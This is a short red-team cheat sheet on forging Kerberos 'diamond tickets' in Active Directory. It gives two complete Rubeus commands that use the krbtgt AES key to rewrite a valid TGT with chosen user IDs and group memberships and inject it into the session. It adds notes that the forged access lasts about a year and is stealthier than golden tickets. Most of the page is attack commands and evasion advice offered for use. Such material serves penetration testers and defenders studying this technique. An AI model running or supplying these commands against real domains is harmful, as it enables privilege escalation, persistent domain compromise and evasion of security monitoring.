# Diamond Ticket

**A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account which makes it less detectable.**

## Modify The Ticket

* If we know the username and password/hash (rc4/ntlm/aes) of any domain user

{% code overflow="wrap" %}
```powershell
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

* If we already have an existing session as any domain user

{% code overflow="wrap" %}
```
Rubeus.exe diamond /domain:DOMAIN /tgtdeleg /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

## Validity

* As long as krbtgt password isn't changed - typically 1 year in big orgs

## OPSEC - Less noisy or more stealthy

* Valid ticket times will be used because the TGT that is being modified is issued by the DC itself.
* Some security solutions check for AS-REQ and AS-REP, and hence there is a change of Golden ticket getting detected.
